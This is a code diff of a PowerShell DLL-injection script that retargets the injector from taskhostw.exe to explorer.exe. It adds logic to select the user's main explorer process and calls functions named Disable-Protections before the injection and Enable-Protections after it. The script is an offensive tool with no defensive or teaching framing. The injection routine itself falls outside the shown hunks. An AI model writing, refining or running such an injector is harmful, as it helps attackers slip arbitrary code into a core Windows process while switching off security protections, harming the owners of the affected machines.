@@ -1,5 +1,5 @@
-# MANUAL DLL INJECTION INTO taskhostw.exe
-# Specifically targets taskhostw.exe processes
+# MANUAL DLL INJECTION INTO explorer.exe
+# Specifically targets explorer.exe processes
 
 param(
     [Parameter(Mandatory=$false)]
@@ -87,26 +87,31 @@ public class AdvancedInjector {
 }
 "@
 
-function Find-taskhostProcess {
-    Write-Host "`n🔍 SEARCHING FOR taskhostw.exe PROCESSES..." -ForegroundColor Yellow
+function Find-ExplorerProcess {
+    Write-Host "`n🔍 SEARCHING FOR explorer.exe PROCESSES..." -ForegroundColor Yellow
     
-    $taskhostProcesses = Get-Process -Name "taskhostw" -ErrorAction SilentlyContinue
+    $explorerProcesses = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
     
-    if ($taskhostProcesses.Count -eq 0) {
-        Write-Host "❌ No taskhostw.exe processes found!" -ForegroundColor Red
+    if ($explorerProcesses.Count -eq 0) {
+        Write-Host "❌ No explorer.exe processes found!" -ForegroundColor Red
         return $null
     }
     
-    Write-Host "✓ Found $($taskhostProcesses.Count) taskhostw.exe process(es):" -ForegroundColor Green
+    Write-Host "✓ Found $($explorerProcesses.Count) explorer.exe process(es):" -ForegroundColor Green
     
-    for ($i = 0; $i -lt $taskhostProcesses.Count; $i++) {
-        $proc = $taskhostProcesses[$i]
-        Write-Host "  [$i] PID: $($proc.Id) | Session: $($proc.SessionId) | Start: $($proc.StartTime.ToString('HH:mm:ss'))" -ForegroundColor Cyan
+    for ($i = 0; $i -lt $explorerProcesses.Count; $i++) {
+        $proc = $explorerProcesses[$i]
+        Write-Host "  [$i] PID: $($proc.Id) | Session: $($proc.SessionId) | Start: $($proc.StartTime.ToString('HH:mm:ss')) | Parent: $($proc.ParentProcessId)" -ForegroundColor Cyan
     }
     
-    # Automatically select the first available process
-    $selectedProcess = $taskhostProcesses[0]
-    Write-Host "`n🎯 Auto-selecting first process: PID $($selectedProcess.Id)" -ForegroundColor Green
+    # Select the main explorer process (usually the one with the lowest PID or session 1)
+    $selectedProcess = $explorerProcesses | Where-Object { $_.SessionId -eq 1 } | Select-Object -First 1
+    
+    if ($null -eq $selectedProcess) {
+        $selectedProcess = $explorerProcesses[0]
+    }
+    
+    Write-Host "`n🎯 Auto-selecting main process: PID $($selectedProcess.Id) (Session: $($selectedProcess.SessionId))" -ForegroundColor Green
     
     return $selectedProcess
 }
@@ -115,7 +120,7 @@ function Invoke-AdvancedInjection {
     param([int]$TargetPID, [string]$DllPath)
     
     Write-Host "`n🛠️  ADVANCED INJECTION STARTING..." -ForegroundColor Yellow
-    Write-Host "Target: taskhostw.exe (PID: $TargetPID)" -ForegroundColor Cyan
+    Write-Host "Target: explorer.exe (PID: $TargetPID)" -ForegroundColor Cyan
     Write-Host "DLL: $DllPath" -ForegroundColor Cyan
     
     $hProcess = [IntPtr]::Zero
@@ -276,8 +281,8 @@ function Enable-Protections {
 }
 
 # MAIN EXECUTION
-Write-Host "taskhostw.exe INJECTOR" -ForegroundColor Magenta
-Write-Host "======================" -ForegroundColor Magenta
+Write-Host "explorer.exe INJECTOR" -ForegroundColor Magenta
+Write-Host "=====================" -ForegroundColor Magenta
 
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
@@ -292,17 +297,17 @@ if (-not (Test-Path $DllPath)) {
 }
 Write-Host "✓ DLL exists: $DllPath" -ForegroundColor Green
 
-# Find and select taskhostw.exe process
-$targetProcess = Find-taskhostProcess
+# Find and select explorer.exe process
+$targetProcess = Find-ExplorerProcess
 if ($null -eq $targetProcess) {
-    Write-Host "❌ No suitable taskhostw.exe process found!" -ForegroundColor Red
+    Write-Host "❌ No suitable explorer.exe process found!" -ForegroundColor Red
     exit 1
 }
 
 Disable-Protections
 
 Write-Host "`n" + "🚀"*30 -ForegroundColor Cyan
-Write-Host "STARTING ADVANCED INJECTION INTO taskhostw.exe..." -ForegroundColor Cyan
+Write-Host "STARTING ADVANCED INJECTION INTO explorer.exe..." -ForegroundColor Cyan
 Write-Host "🚀"*30 -ForegroundColor Cyan
 
 $success = Invoke-AdvancedInjection -TargetPID $targetProcess.Id -DllPath $DllPath
@@ -310,9 +315,10 @@ $success = Invoke-AdvancedInjection -TargetPID $targetProcess.Id -DllPath $DllPa
 Enable-Protections
 
 if ($success) {
-    Write-Host "`n🎉 SUCCESS! DLL injected into taskhostw.exe (PID: $($targetProcess.Id))" -ForegroundColor Green
+    Write-Host "`n🎉 SUCCESS! DLL injected into explorer.exe (PID: $($targetProcess.Id))" -ForegroundColor Green
     Write-Host "The DLL should now be loaded in the target process" -ForegroundColor Cyan
+    Write-Host "Note: explorer.exe will likely restart itself if it crashes" -ForegroundColor Yellow
 } else {
-    Write-Host "`n❌ FAILED! Injection into taskhostw.exe was unsuccessful." -ForegroundColor Red
-    Write-Host "taskhostw.exe is highly protected by Windows." -ForegroundColor Yellow
+    Write-Host "`n❌ FAILED! Injection into explorer.exe was unsuccessful." -ForegroundColor Red
+    Write-Host "Check if the target process is still running and accessible." -ForegroundColor Yellow
 }
